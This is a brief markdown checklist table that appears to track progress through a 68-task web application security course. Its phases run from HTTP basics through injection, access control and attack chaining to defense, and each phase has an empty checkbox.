| Phase 1: Foundation & HTTP Mechanics (Tasks 0.1–2.4) | ☐ |
| Phase 2: Authentication & Input Attacks (Tasks 3.1–5.3) | ☐ |
| Phase 3: Injection & File Attacks (Tasks 6.1–8.3) | ☐ |
| Phase 4: Access Control & Trust Abuse (Tasks 9.1–10.4) | ☐ |
| Phase 5: Chaining, Defense & Mastery (Tasks 11.1–13.4) | ☐ |
| **All 68 Tasks Complete** | ☐ |
